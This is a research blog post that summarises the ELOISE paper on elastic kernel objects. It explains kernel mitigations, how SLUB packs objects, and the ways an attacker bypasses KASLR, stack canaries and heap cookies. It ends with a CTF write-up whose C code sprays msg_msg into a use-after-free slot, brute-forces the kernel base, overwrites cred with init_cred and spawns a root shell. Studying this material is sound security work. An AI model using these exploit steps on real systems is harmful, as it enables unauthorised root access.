---
title: Playing with Elastic Kernel Objects
slug: playing-with-elastic-kernel-objects
date: 2026-03-22
tags:
  - Windows
  - Kernel
  - Exploitation
  - Research
---
# ELOISE: Elastic Objects in Kernel Exploitation

![](/images/1.gif)

I spent some time reading through the [ELOISE](https://dl.acm.org/doi/abs/10.1145/3372297.3423353) paper from CCS 2020 and wanted to write up my notes in a way that actually makes sense. The paper is dense but the core idea is elegant once you get it.
## The Setup

Modern OS kernels are not easy to exploit. Over the years the kernel has accumulated a serious stack of protections:

```
┌─────────────────────────────────────────────────────────────┐
│                    KERNEL PROTECTION STACK                  │
├─────────────────────────────────────────────────────────────┤
│  KASLR    - Kernel Address Space Layout Randomization       │
│  SMEP     - Supervisor Mode Execution Prevention            │
│  SMAP     - Supervisor Mode Access Prevention               │
│  KPTI     - Kernel Page Table Isolation                     │
│  Stack Canary - Guard values to detect stack overflows      │
│  Heap Cookie  - Metadata integrity for heap allocations     │
│  W⊕R      - Memory regions are either Writable OR Readable  │
│  Freelist Randomization - Randomized heap freelist          │
└─────────────────────────────────────────────────────────────┘
```

Even if you find a memory corruption bug, you still need to climb a ladder before you can do anything useful:

```
STEP 1: Have a memory-corruption vulnerability (OOB write, UAF, DF)
           │
           ▼
STEP 2: Bypass KASLR → learn where kernel code is loaded
           │
           ▼
STEP 3: Defeat heap/stack cookies → validate exploit primitives
           │
           ▼
STEP 4: Achieve arbitrary read/write → full kernel control
           │
           ▼
STEP 5: Privilege escalation → root / full system compromise
```

Researchers had already shown that something called "elastic kernel objects" could help climb this ladder, but only on individual handpicked vulnerabilities. Nobody had asked whether this was broadly useful or just a lucky coincidence each time. ELOISE answers that question systematically across 40 vulnerabilities on Linux, FreeBSD and XNU.
## What Even Is an Elastic Kernel Object?

An elastic kernel object is any kernel object that has three things going for it:

1. A **length field** somewhere inside it (`len`, `size`, `bmp_len`, whatever the developer called it)
2. That length field **controls how much of a buffer the kernel will read or write**
3. There is a **disclosure channel**, meaning some code path that copies data from that buffer back to userspace

```
┌─────────────────────────────────────────────────────────────────┐
│                     ELASTIC KERNEL OBJECT                       │
│                                                                 │
│   ┌──────────┬──────────┬──────────────────────────────────┐    │
│   │ header   │  LEN     │         buffer (elastic)         │    │
│   │ fields   │  field   │   actual size controlled by LEN  │    │
│   └──────────┴──────────┴──────────────────────────────────┘    │
│                  ↑                                              │
│            If an attacker                                       │
│            overwrites LEN,                                      │
│            the kernel will                                      │
│            read BEYOND the buffer!                              │
└─────────────────────────────────────────────────────────────────┘
```

![](/posts/img/2026-03-22_21-41.png)

The key insight is simple: if you can overwrite that length field with a larger number, the kernel will happily copy more bytes than it should to userspace. Those extra bytes come from whatever happens to sit next to your object in memory, which could include function pointers, cookies, or other sensitive values.

There are four ways this can be structured in practice.
### Variant 1: Buffer Inline

The most common case. The buffer lives inside the object itself.

```c
struct kernel_object {
    int  len;          // length field
    char buffer[MAX];  // elastic buffer INSIDE object
}

┌──────┬──────────────────────────────────┐
│ len  │ [===used===][......unused......] │
└──────┴──────────────────────────────────┘
         only `len` bytes should be read
```
### Variant 2: External Buffer with Direct Pointer

The buffer lives outside the object but there is a direct pointer to it.

```c
struct kernel_object {
    int   len;   // length field
    void *ptr;   // pointer to EXTERNAL buffer
}

Object:  ┌──────┬─────┐
         │ len  │ ptr─┼──────────────────────┐
         └──────┴─────┘                      │
                                             ▼
                            ┌───────────────────────┐
                            │  external buffer      │
                            │  [===len bytes===]    │
                            └───────────────────────┘
```
### Variant 3: External Buffer via Intermediate Object

A chain: object A points to object B which points to the buffer.

```
Object A ──ptr──► Object B ──ptr──► Buffer C

┌───────┐         ┌───────┐         ┌─────────────────────┐
│  len  │         │  ptr  │─────────►  buffer data        │
│  ptr  ├────────►│       │         │  [len bytes]        │
└───────┘         └───────┘         └─────────────────────┘
```
### Variant 4: Length and Pointer in the Same Object

This is the dangerous one. When both the pointer and the length field live inside the same object, and an attacker can control both, you get arbitrary read anywhere in the kernel.

```c
struct kernel_object {
    void *ptr;  // attacker sets this to any kernel address
    int   len;  // attacker sets this to a large value
}

// Attacker sets ptr = target_address, len = large_value
// kernel reads from target_address for len bytes
// discloses arbitrary kernel memory to userspace
```
## A Real Example: `xfrm_replay_state_esn`

To make this concrete, here is the struct from the paper's main example.

**XFRM** is the Linux kernel's IPSec implementation. The name stands for "transform", referencing how IPSec transforms IP packets. If you want to go deeper on the protocol side, the relevant RFCs are:

- [RFC4301](https://www.rfc-editor.org/rfc/rfc4301): IPSec protocol definition
- [RFC4302](https://www.rfc-editor.org/rfc/rfc4302): Authentication Header (AH)
- [RFC4303](https://www.rfc-editor.org/rfc/rfc4303): Encapsulating Security Payload (ESP)

The IPSec protocol supports either 32-bit or 64-bit sequence numbers. The 64-bit variant is called Extended Sequence Numbers, ESN for short. The `xfrm_replay_state_esn` struct is the data structure the kernel uses to track ESN replay protection. `seq` and `seq_hi` together form a 64-bit inbound sequence number, `oseq` and `oseq_hi` form the outbound counterpart, `replay_window` defines how many past packets are remembered to detect duplicates, and `bmp[0]` is a flexible array (a zero-length tail) acting as a dynamic bitmask where each bit corresponds to a received packet.

```c
// Linux kernel: include/uapi/linux/xfrm.h
struct xfrm_replay_state_esn {
    unsigned int    bmp_len;    // THE LENGTH FIELD
    __u32           oseq;
    __u32           seq;
    __u32           oseq_hi;
    __u32           seq_hi;
    __u32           replay_window;
    __u32           bmp[0];     // THE ELASTIC BUFFER (flexible array)
};
```

The whole struct is allocated as a single contiguous memory block. `bmp_len` tells the kernel how many 32-bit words are in the bmp bitmap. If you inflate `bmp_len`, the kernel reads past the bitmap into whatever object sits next to it in the slab.

```
Memory layout in kmalloc slab:

 xfrm_replay_state_esn         adjacent object
┌──────────────────────────────┬──────────────────────────────┐
│ bmp_len │ oseq │ seq │ ...   │ f_op pointer to              │
│  (LEN)  │      │     │ bmp[] │ ext4_file_operations         │
└──────────────────────────────┴──────────────────────────────┘
    ↑                                    ↑
    Attacker inflates bmp_len            This function pointer
    via vulnerability overwrite          is now readable
                                         reveals kernel base addr
                                         KASLR bypassed
```

## SLAB, SLUB and SLOB

Since we keep talking about slabs and caches, worth a quick detour.

**SLAB** is the original kernel object allocator, introduced in 1994 by Jeff Bonwick. The idea was object caching: frequently allocated objects like `task_struct` or `inode` get their own dedicated cache so that allocation is just grabbing a pre-initialized object rather than zeroing and setting up memory from scratch every time. When Linux spawns a process it needs a `task_struct`. Instead of calling `kmalloc` and reinitializing everything, SLAB maintains a `task_struct` cache so the allocation is just a pointer grab from a pre-warmed slab, avoiding constructor/destructor overhead every time.

**SLUB** replaced SLAB as the default in kernel 2.6.23. It simplifies the design by eliminating the complex per-CPU queues and per-slab metadata, embedding metadata directly into unused objects instead. This makes it faster and easier to debug. `CONFIG_SLUB_DEBUG` gives you built-in sanity checks and you can run `cat /sys/kernel/slab/dentry/alloc_calls` to see exactly where in the kernel those allocations are happening. Every modern Linux distro ships SLUB.

**SLOB** (Simple List Of Blocks) was the minimalist allocator for embedded and memory-constrained systems. It used a simple first-fit linked list with almost no overhead, sacrificing performance for a tiny footprint. It was removed from the kernel in v6.4 (2023) since modern embedded systems are powerful enough to just use SLUB.

The reason this matters for exploitation is that the allocator determines how objects get packed together in memory. When SLUB serves two objects from the same cache, they can end up in adjacent slots on the same slab page. That adjacency is exactly what heap overread exploits depend on. Knowing which cache (`kmalloc-64`, `kmalloc-192`, etc.) an object lands in tells you which other objects could be sitting right next to it.
## The Three Attack Capabilities

Before going into how ELOISE finds these objects automatically, it helps to understand exactly what these objects let you do.

|Capability|Mechanism|What It Bypasses|
|---|---|---|
|**Heap Overread**|Inflate `len`, read adjacent slot|KASLR (via function ptr), Heap Cookie|
|**Stack Overread**|Inflate `len` of stack buffer, read up stack frame|Stack Canary, Return Address|
|**Arbitrary Read**|Control both `ptr` AND `len` in same object|Everything|
### KASLR Bypass via Heap Overread

KASLR randomizes where the kernel loads in memory at boot. Without it, an attacker can hardcode jump targets. With it, they need to leak a pointer first to calculate the base address. The trick is that the kernel is full of objects containing function pointers, and those function pointers are compiled-in constants offset from the kernel base. If you can read one, you can subtract the known compile-time offset and recover where the kernel loaded.

```
BEFORE EXPLOITATION:
┌─────────────────────────────────────────────────────────┐
│  kmalloc-192 slab                                       │
│                                                         │
│  Slot 0 (victim): xfrm_replay_state_esn                 │
│  ┌─────────────────────────────┐                        │
│  │ bmp_len=5  │ bmp[5 words]   │                        │
│  └─────────────────────────────┘                        │
│                                                         │
│  Slot 1 (adjacent): file object                         │
│  ┌─────────────────────────────┐                        │
│  │ ... │ f_op=0xffffffff814abc │  kernel function ptr   │
│  └─────────────────────────────┘                        │
└─────────────────────────────────────────────────────────┘

AFTER OVERWRITING bmp_len:
┌─────────────────────────────────────────────────────────┐
│  Slot 0 (victim):                                       │
│  ┌─────────────────────────────┐                        │
│  │ bmp_len=256 │ bmp[5 words]  │   bmp_len inflated     │
│  └─────────────────────────────┘                        │
└─────────────────────────────────────────────────────────┘

Call recvmsg()
→ kernel copies bmp_len=256 bytes to user
→ reads 256 bytes starting from bmp[]
→ overreads into adjacent slot
→ userspace receives f_op = 0xffffffff814abc00

kernel_base = f_op - known_offset_of_ext4_file_operations
KASLR completely defeated
```

The attacker does not need to guess which object is adjacent. Using heap spray techniques they can fill the slab with objects they control, making it very likely that the slot next to the elastic object is something with a useful function pointer.
### Stack Canary Bypass via Stack Overread

The stack canary is a random value the compiler plants between local variables and the return address. If an overflow corrupts it, the kernel panics before returning. But if you can read it first, you can include the correct value in your exploit and the check passes as if nothing happened.

```
Stack frame layout:

High addresses
┌────────────────────────────────┐
│    return address              │  goal: read this, bypass KASLR
├────────────────────────────────┤
│    saved RBP                   │
├────────────────────────────────┤
│    stack canary (random)       │  goal: read this, bypass canary check
├────────────────────────────────┤
│    local variables             │
├────────────────────────────────┤
│    elastic buffer[MAX]         │  starts here
│    (len field nearby)          │  inflate len, read upward
└────────────────────────────────┘
Low addresses
```

If `len` is inflated beyond the actual buffer size, the copy reads up through the canary and the return address. Userspace receives the canary value and a kernel address in one shot. This matters because the return address is also a kernel pointer, so you bypass KASLR at the same time.
### Arbitrary Kernel Read

To understand this one it helps to know what the IDT is. The **Interrupt Descriptor Table** is a kernel data structure that tells the CPU what function to jump to when a specific interrupt fires. It is essentially the CPU's lookup table for every exception, hardware interrupt, and software trap on x86.

The IDT is an array of 256 entries (gate descriptors), each 16 bytes on x86-64. Each entry holds the handler's address, privilege level, segment selector, and gate type. The CPU finds this table via the `IDTR` register loaded with `lidt`.

```
IDT[0]   → Divide-by-zero handler   (#DE)
IDT[1]   → Debug exception          (#DB)
IDT[13]  → General Protection Fault (#GP)
IDT[14]  → Page Fault handler       (#PF)
IDT[32]  → Hardware IRQ 0 (timer)
IDT[128] → System call (int 0x80)
```

When your program calls `int 0x80`, the CPU reads `IDT[128]`, extracts the handler address, switches to ring 0, pushes registers, and jumps to `system_call()`. All in hardware before any kernel C code runs.

Now for the arbitrary read attack:

```
Normal operation:
  struct obj { void *ptr; int len; }
  kernel copies `len` bytes from `ptr` to user

Attacker controls both ptr AND len (same object):
  set ptr = 0xffffffff82001000   (IDT table address)
  set len = 0x1000               (read 4KB)
  kernel copies 4KB from IDT to userspace
  compute kernel base from IDT entries
  KASLR, stack canary, heap cookie all become known
  attacker can also search for "root:!:" in /etc/shadow
```

This is more powerful than the heap overread case because you are not waiting for something interesting to land adjacent to your object. You get to choose the address directly.
### Heap Cookie (SLUB freelist encoding)

The heap cookie is how SLUB protects its freelist pointers. Free slots in a slab do not just store the raw address of the next free object. They XOR it with a secret and the slot's own address:

```c
// Linux SLUB allocator: mm/slub.c
static inline void *freelist_ptr(const struct kmem_cache *s, void *ptr,
                                  unsigned long ptr_addr) {
    return (void *)((unsigned long)ptr ^ s->random ^ ptr_addr);
}
```

The idea is that even if an attacker reads a free slot they cannot directly use the value they see as a pointer. But the elastic overread changes the game. When you overread into a free slot you get the encoded pointer. If you also know (or can infer) the slot's address, you only need to recover `s->random` to decode it. And once you have the decoded freelist pointer you can forge allocations to arbitrary addresses, which is how you turn an information leak into full write-what-where.

```
Heap cookie bypass via overread:
  1. Spray elastic objects into slab
  2. Trigger overread into adjacent FREE slot
  3. Free slot contains: encoded_ptr = real_ptr XOR random XOR addr
  4. Recover the real pointer using known values
  5. SLUB freelist protection is broken
```
## How ELOISE Works

ELOISE is a three-phase static analysis tool built on LLVM. 
### Phase 1: Finding Elastic Object Candidates

The first challenge is that nested structs make length fields hard to find automatically. If you have:

```c
struct outer {
    struct inner {
        int nested_len;   // we want to find this
        char *data;
    } in;
    char buf[100];
}
```

ELOISE recursively flattens everything:

```
Input:  outer { inner { int, char* }, char[100] }
Step 1: expand inner → outer { int, char*, char[100] }
Step 2: no more nested structs
Output: outer_flat { int nested_len, char* data, char[100] buf }
Integer field 'nested_len' is now directly visible
```

After flattening, ELOISE marks any struct with an integer field as a candidate. Then for each kernel allocation site (`kmalloc`, `kmem_cache_alloc`, etc.) it uses use-def chain analysis to figure out what type was just allocated. If that type is a candidate and the allocation does not require root, the object goes into the candidate set.

For cache membership, the logic is:

```
kmalloc(132, GFP_KERNEL):
  132 > kmalloc-128's max (128 bytes)
  132 < kmalloc-256's max (256 bytes)
  Object belongs to kmalloc-192

kmalloc(sizeof(base) + variable, GFP_KERNEL):
  Can't determine exact size statically
  Object could belong to any general cache >= sizeof(base)
  Mark with * (cache-flexible, more exploitable)
```
### Phase 2: Filtering for Disclosure Channels

![](/posts/img/2026-03-22_21-44.png)

Having a length field means nothing if the kernel never copies data through it to userspace. Phase 2 filters the candidate set down to objects that actually have this path.

ELOISE looks for "leaking anchors", which are call sites of functions like `copy_to_user`, `copyout`, `nla_put`, `skb_put_data`. From each anchor it runs backward taint analysis on both the length argument and the data argument.

```c
ALGORITHM: FilterByDisclosure(candidates, kernel_bitcode)

LEAKING_ANCHORS = {
    copy_to_user(dst, src, n),     // n = length taint source
    copyout(kernel_addr, user_addr, nbytes),
    nla_put(skb, type, attrlen, data),
    skb_put_data(skb, data, len),
    // ...
}

FOR each anchor (fn, len_arg, data_arg) in LEAKING_ANCHORS:

    len_source = backward_taint(len_arg)
    IF len_source is on STACK or GLOBAL:
        DISCARD  // can't manipulate via heap vulnerability
    IF len_source is on HEAP:
        elastic_obj = object_containing(len_source)

        data_sources = backward_taint(data_arg)
        FOR each src in data_sources:
            IF src is STACK address:
                → capability: STACK_OVERREAD (leaks canary)
            IF src is HEAP address (field of object):
                → capability: HEAP_OVERREAD (leaks KASLR, heap cookie)
            IF src is POINTER in elastic_obj AND
               ptr and len are in SAME object:
                → capability: ARBITRARY_READ

        store (elastic_obj, anchor, capability) in DATABASE
```

### Phase 3: Backward Taint Analysis in Detail

![](/posts/img/2026-03-22_21-54.png)

The taint analysis starts at the `copy_to_user` call and walks backward through the data flow graph. For the length argument `n`, it follows definitions and loads until it hits either a stack allocation, a global variable, or a heap object field. If it hits heap, it records which object and which field offset. For the data argument `src`, it does the same but classifies the result differently depending on whether it points to stack memory, a heap field, or a pointer that is in the same object as the length field.

```
Target function: copy_to_user(dst, src, n)
                                    ↑   ↑
                              data arg  len arg

Trace n backwards through data flow:

n = objB->len_field      HEAP (objB is on heap)
                │
                ▼ continue: trace src

    src = &elastic_buf   PATH 1: stack buffer
    src = &objA->buffer  PATH 2: heap field
    src = objA->ptr      PATH 3: pointer (check if ptr in same obj as len)

PATH 1: elastic_buf on STACK
  overread reads stack canary, ret addr
  CAPABILITY: stack_canary, KASLR bypass

PATH 2: objA->buffer on HEAP
  overread reads adjacent slot
  CAPABILITY: heap_cookie, KASLR bypass

PATH 3: ptr in objA, len in objB
  Are objA == objB?
  YES → attacker can set ptr to arbitrary addr → ARBITRARY_READ
  NO  → only heap overread capability
```

One detail worth noting: when there is a multi-layer dereference like `A->B->len`, ELOISE only taints one `LoadInst` backward. This prevents it from mistakenly treating the outer container `A` as the elastic object when the actual elastic object is `B`.
### Phase 3: Pairing with Vulnerabilities

The final phase takes a PoC program for a known vulnerability and asks: can this vulnerability actually exploit any of the elastic objects we found?

First, run the PoC under GDB to figure out which cache gets corrupted and what memory the attacker can write. Model this as a capability:

```
Example result (CVE-2017-8890):
  capability = (kmalloc-64, [
      [0,  8) = kaddr,    first 8 bytes = any kernel addr
      [8,  16) = kaddr,   next 8 bytes = any kernel addr
      [16, 18) < 46,      2 bytes, value < 46
      [18, 64) = *        rest = arbitrary
  ])
```

Then for each elastic object whose cache overlaps with the corrupted cache, check whether the vulnerability's writable region actually covers the object's length field offset. If it does, feed the combined constraints into Z3:

```
path_constraints AND vuln_constraints → Z3.solve()

SAT   → vulnerability CAN use this elastic object
UNSAT → path is infeasible with this vulnerability
```

The path constraints come from branch conditions along the code path between the elastic object and the leaking anchor. For example, if there is an `if (obj->len < 4048)` guard before `copy_to_user`, that becomes a constraint that the attacker's inflated value must satisfy. Z3 checks whether the vulnerability's capability can simultaneously satisfy those guards and still achieve a useful overread.
## CVE-2017-8890 in Detail

**Type:** Double Free  
**Subsystem:** Linux TCP/IP (`inet_csk_clone_lock`)  
**Affected:** Linux kernel < 4.11

```c
static struct sock *inet_csk_clone_lock(const struct sock *sk,
                                         const struct request_sock *req,
                                         const gfp_t priority) {
    struct sock *newsk = sk_clone_lock(sk, priority);
    if (newsk) {
        // BUG: inet_sk(newsk)->mc_list can get freed twice
    }
    return newsk;
}
```

Vulnerability capability:

```
Corrupted cache: kmalloc-64

 Offset:  0        8        16       18       64
          │        │        │        │        │
          ▼        ▼        ▼        ▼        ▼
 Memory: [kaddr  ][kaddr  ][<46][  arbitrary  ]
```

Formal: `(kmalloc-64, [([0,8)=kaddr), ([8,16)=kaddr), ([16,18)<46), ([18,64)=*)])`

ELOISE matches this against `msg_msg`:

```c
// Linux kernel: include/linux/msg.h
struct msg_msg {
    struct list_head m_list;  // [0, 16)   list pointers (2 x kaddr)
    long m_type;              // [16, 24)
    size_t m_ts;              // [24, 32)  THE LENGTH FIELD
    struct msg_msgseg *next;  // [32, 40)
    void *security;           // [40, 48)
    /* actual message follows immediately */
};
```

```
obj.cache = kmalloc-64 

Length field m_ts is at [24, 32)
Vuln can write [18, 64) = arbitrary
[24, 32) is inside [18, 64) 

Constraint check (Z3):
  vuln sets [24,32) = arbitrary value N
  path constraint: N < 4048 (valid message size)
  Z3: SAT with N = 4000 

RESULT: CVE-2017-8890 can use msg_msg for heap overread
```

`msg_msg` is a particularly useful spray primitive because any unprivileged user can create message queues and send messages through `msgsnd`. The message payload gets allocated in the same slab as `msg_msg` itself, so you can easily fill a slab with these objects and get predictable layout before triggering the vulnerability.

The full exploit flow:

```
┌──────────────────────────────────────────────────────────────────┐
│                    CVE-2017-8890 Exploit Flow                    │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. HEAP GROOMING                                                │
│     kmalloc-64 slab:                                             │
│     [slot0: msg_msg] [slot1: msg_msg] ...                        │
│     Spray many msg_msg objects                                   │
│                          ↓                                       │
│  2. TRIGGER VULNERABILITY                                        │
│     Double-free corrupts object in kmalloc-64                    │
│     Reclaim freed slot with crafted msg_msg                      │
│     Set m_list[0] = kaddr, m_list[1] = kaddr                     │
│     Set m_ts = 4000 (inflated from real size ~50)                │
│                          ↓                                       │
│  3. TRIGGER DISCLOSURE                                           │
│     Call msgrcv() → kernel reads m_ts bytes from msg_msg         │
│     Should read ~50 bytes, reads 4000                            │
│     Overreads into adjacent kmalloc-64 slot                      │
│                          ↓                                       │
│  4. LEAK FUNCTION POINTER                                        │
│     Adjacent slot has object with function pointer               │
│     Userspace receives 4000 bytes including f_op                 │
│     leaked_ptr = *(uint64_t*)(recv_buf + offset)                 │
│     kernel_base = leaked_ptr - known_symbol_offset               │
│                          ↓                                       │
│  5. KASLR BYPASSED                                               │
│     All symbol addresses now computable                          │
│                                                                  │
│  Security Impact: SC ✓  HC ✓  BA ✓  AR ✓                         │
│  Suitable elastic objects found: 12 + (1)                        │
└──────────────────────────────────────────────────────────────────┘
```

PoC pseudocode:

```c
#include <sys/ipc.h>
#include <sys/msg.h>

#define MSG_SIZE        50
#define INFLATED_LEN    4000
#define KMALLOC64_SPRAY 200

int exploit_kaslr_cve_2017_8890() {
    // Step 1: Spray msg_msg objects into kmalloc-64
    int msgids[KMALLOC64_SPRAY];
    char payload[MSG_SIZE];

    for (int i = 0; i < KMALLOC64_SPRAY; i++) {
        msgids[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0600);
        msgsnd(msgids[i], payload, MSG_SIZE, 0);
    }

    // Step 2: Trigger the double-free
    trigger_double_free();

    // Step 3: Reclaim freed slot with crafted msg_msg
    struct controlled_msg {
        unsigned long m_list[2];  // two valid kernel addresses
        long          m_type;     // = 1
        size_t        m_ts;       // = INFLATED_LEN  <-- key
        void         *next;       // = NULL
        void         *security;   // = NULL
    } crafted;

    crafted.m_ts = INFLATED_LEN;
    // inject via UAF/DF reclaim path

    // Step 4: Read inflated message
    char recv_buf[INFLATED_LEN + sizeof(long)];
    msgrcv(victim_msgid, recv_buf, INFLATED_LEN, 0, MSG_NOERROR);

    // Step 5: Scan for kernel pointer
    for (int i = 0; i < INFLATED_LEN; i += 8) {
        unsigned long val = *(unsigned long *)(recv_buf + i);
        if ((val >> 48) == 0xffff) {
            unsigned long kernel_base = val - known_offset;
            printf("[+] Kernel base: 0x%lx\n", kernel_base);
            return kernel_base;
        }
    }
    return -1;
}
```
## Choosing Elastic Buffer

The ELOISE paper is great at explaining the theory but it does not tell you how to actually decides which elastic object to reach for. The answer comes from a real challenge: Steam Driver from HTB UNI CTF Quals 2021, written by FizzBuzz101. 

The challenge gives you a kernel driver for a "steam engine management system". The driver has two object types:

```c
typedef struct {
    id_t    id;
    uint8_t usage;           // reference counter
    char    engine_name[NAME_SZ];
    char   *logs;            // pointer to a 256-byte log buffer
} engine_t;                  // sizeof = 56 → goes into kmalloc-64

typedef struct {
    id_t       id;
    char       compartment_desc[DESC_SZ];
    engine_t  *engine;       // pointer back to the engine
} compartment_t;             // sizeof = 128 → goes into kmalloc-128
```

The mitigations on the box were all on: SMEP, SMAP, KPTI, and 2 CPU cores with no mutex locking anywhere in the driver. That last detail is the bug. `add_compartment` has a window where you can race two threads to overflow the `usage` reference counter past its `0xff` check and trick `automated_engine_shutdown` into freeing an engine that still has live compartments pointing to it.

```c
Thread 1                          Thread 2
add_compartment(engine)           add_compartment(engine)
  check usage < 0xff  ✓             check usage < 0xff  ✓
  usage++  (now 0xff)               usage++  (now 0x00 overflow!)
  automated_engine_shutdown()   →   engine freed while comps still point to it
```

After winning the race, you have a dangling `engine_t *` inside one or more `compartment_t` objects. `show_engine_log` and `update_engine_log` will happily read and write through that stale pointer.

This is the part that connects directly to ELOISE. You have a UAF on a freed `kmalloc-64` slot. The question is: what elastic object do you spray into that slot?

The driver has two operations that use that stale pointer:

```c
static long show_engine_log(id_t target_compartment, char *log) {
    // finds compartment, then:
    copy_to_user(log, compartments[idx]->engine->logs, LOG_SZ);
    //                               ↑
    //                   follows stale engine pointer
    //                   reads engine->logs field
    //                   copies LOG_SZ bytes from that address to user
}

static long update_engine_log(id_t target_compartment, char *log) {
    // finds compartment, then:
    copy_from_user(compartments[idx]->engine->logs, log, LOG_SZ);
    //                                ↑
    //                    follows stale engine pointer
    //                    reads engine->logs field
    //                    copies LOG_SZ bytes from user to that address
}
```

Both functions follow the stale pointer, read the `logs` field out of whatever is at that address now, and then either read from or write to wherever `logs` points.

So the question becomes: what is at that freed address now?

When SLUB frees the `engine_t`, it does not zero the memory. It just marks that 64-byte slot as available for the next allocation in `kmalloc-64`. The slot still contains the old `engine_t` bytes until something overwrites them.

The memory layout of `engine_t` was:

```
engine_t (56 bytes, lives in kmalloc-64):

Offset 0:   id          (4 bytes)
Offset 4:   usage       (1 byte)
Offset 5:   padding     (3 bytes)
Offset 8:   engine_name (40 bytes, NAME_SZ = 0x28)
Offset 48:  logs        (8 bytes, pointer to kmalloc-256 buffer)
````

The `logs` field is at offset 48, which is `0x30`.

`kmalloc-64` does not have many useful kernel objects triggerable from userland. What you ideally want is a structure that puts a pointer at the offset where `engine_t->logs` used to be. If you can control that pointer, `show_engine_log` becomes an arbitrary read and `update_engine_log` becomes an arbitrary write.

When `show_engine_log` runs, it does:

`compartments[idx]->engine->logs`

Which in memory terms means: go to the freed address, skip 48 bytes, read the 8-byte pointer sitting there, then copy from whatever address that pointer holds.

So whatever object reclaims that freed slot, if it has anything at offset 48, that thing gets treated as a pointer and the driver reads 256 bytes from it.

The decision checklist looks like this:

```bash
1. What cache holds the freed object?
   engine_t is 56 bytes → kmalloc-64

2. What elastic objects live in kmalloc-64?
   msg_msg → smallest allocation fits kmalloc-64
           → first 0x30 bytes are metadata, then the message body
           → message body is fully user-controlled
           → msgrcv() is an unprivileged disclosure channel

3. Does the layout align with what we need?
   engine_t->logs is at offset 0x30 (after id + usage + engine_name)
   msg_msg metadata is exactly 0x30 bytes (m_list + m_type + m_ts + next + security)
   → message body starts right where logs pointer was
   → spray a msg_msg with a kernel address as first 8 bytes of the body
   → that address lands exactly at the logs offset
   → show/update now read/write from that address

4. Is there a disclosure channel without root?
   msgsnd() and msgrcv() are both unprivileged ✓
```

Visually what this looks like in memory after the spray:

```bash
BEFORE (valid engine_t in kmalloc-64):
┌────────────────────────────────────────────────────────────┐
│  id (4B) │ usage (1B) │ pad (3B) │ engine_name (40B) │     │
│                                                      │     │
│  logs ptr (8B) → points to kmalloc-256 log buffer    │     │
└────────────────────────────────────────────────────────────┘

AFTER race: engine_t freed, slot reclaimed by msg_msg:
┌────────────────────────────────────────────────────────────┐
│  m_list[0] (8B) │ m_list[1] (8B) │ m_type (8B) │           │
│  m_ts (8B)      │ next (8B)      │ security (8B)│          │
│                                                            │
│  [message body starts here = offset 0x30]                  │
│  leaker[0] = 1 (msg_type)                                  │
│  leaker[1] = target_address  ← lands at logs offset!       │
└────────────────────────────────────────────────────────────┘

compartment_t still thinks it holds a valid engine_t *
→ show_engine_log reads LOG_SZ bytes from leaker[1]
→ arbitrary read at any address
```

With arbitrary read, the next step is defeating KASLR. 

In this challenge the driver does:

```c
copy_to_user(log, compartments[idx]->engine->logs, LOG_SZ);
//                                                  ↑
//                                           fixed constant 0x100
```

`LOG_SZ` is a compile-time constant. GCC saw a fixed-size `copy_to_user` call and optimized out the USERCOPY bounds check entirely. So even if the source address points into kernel `.text`, the copy goes through without complaint. This is the accidental bug that makes the brute force possible.

The USERCOPY hardening in this build was accidentally compiled out because the driver used a fixed size for the length argument, so we could brute force the kernel base directly by scanning the kernel's `.text` region:

```c
uint64_t test = 0xffffffff80000000ull;
uint64_t kbase = 0;
uint64_t *leaker = (uint64_t *)buffer;

leaker[0] = 1;          // msg_type
leaker[1] = test;       // this becomes the logs pointer

while (test <= 0xffffffffc0000000ull) {
    send_msg(qid, message, 0x10, 0);       // spray msg_msg with leaker[1] = test
    if (show(fd, uaf, log) == 0) {         // if copy_to_user succeeds, address is valid
        kbase = test;
        printf("\nKernel base at: 0x%llx\n", kbase);
        break;
    }
    printf("testing kernel base at: 0x%llx\r", test);
    get_msg(qid, recieved, 0x10, 0, IPC_NOWAIT | MSG_NOERROR);  // free the msg_msg
    test += 0x100000;                      // step 1MB at a time through .text range
    leaker[1] = test;
}
```

The reason this works is that `copy_to_user` fails gracefully when the source address is unmapped and returns an error, but succeeds silently when the address is valid. So the `show()` return value acts as a probe: -1 means the address is not mapped, 0 means it is. The kernel `.text` section starts at a fixed offset from the kernel base, so once you find the first valid address in that range you can compute the base.

With `kbase` known, we used the arbitrary read to leak `page_offset_base`, which is the start of physmap. Physmap is a region of kernel virtual memory that maps 1:1 to all physical memory. Once you have it, you can scan physical memory for your process's `task_struct` by setting the process name to a known string via `prctl(PR_SET_NAME, "EXPLOIT")` and searching for that string in the physmap region:

```c
char marker[] = "EXPLOIT";
prctl(PR_SET_NAME, marker);

uint64_t curr_task = physmap;
while (found_offset < 0) {
    curr_task += 0x100;
    leaker[1] = curr_task;
    send_msg(qid, message, 0x10, 0);
    show(fd, uaf, log);          // reads 0x100 bytes from curr_task into log[]
    get_msg(qid, recieved, 0x10, 0, IPC_NOWAIT | MSG_NOERROR);
    found_offset = check_if_cred(log, marker, 0x100, sizeof(marker));
}
```

Once you find the marker in physical memory, the credential pointers for the current process sit at a known offset just before it (the `comm` field in `task_struct` is immediately after the `cred` and `real_cred` pointers). Overwrite both with `init_cred` via the arbitrary write primitive and the process becomes root.

```c
// found_offset is where "EXPLOIT" string sits inside the log[] read
// cred and real_cred are 0x10 and 0x08 bytes before comm
*(uint64_t *)(log + found_offset - 0x10) = init_cred;
*(uint64_t *)(log + found_offset - 0x08) = init_cred;
update(fd, uaf, log);   // arbitrary write to physmap address = writes to physical memory

printf("[+] current uid: %d\n", getuid());
system("/bin/sh");       // root
```
## Results

Out of 74 confirmed elastic objects across Linux, FreeBSD and XNU:

```
Heap overread potential (H):    70/74 = 94.6%   KASLR + Heap Cookie
Arbitrary read potential (A):   28/74 = 37.8%   full kernel read
Stack overread potential (S):    5/74 =  6.8%   Stack Canary
No privilege required:          60/74 = 81.1%

Allocation/usage sites:
  Linux:   39,483
  FreeBSD: 44,956
  XNU:     22,307
```

Out of 40 vulnerabilities tested, 27 (67.5%) could bypass KASLR and heap cookie protection. 8 could perform arbitrary read. The 13 failures broke down like this: 4 cases where the corruption stayed entirely inside the vulnerable object and could not reach any adjacent elastic object, 5 cases where the corrupted region did not overlap any length field, 1 case where the vulnerability could only write zero (CVE-2018-4243, which meant the length field would be zeroed rather than inflated), and 3 cases where corruption happened in a special cache that had no elastic objects at all.

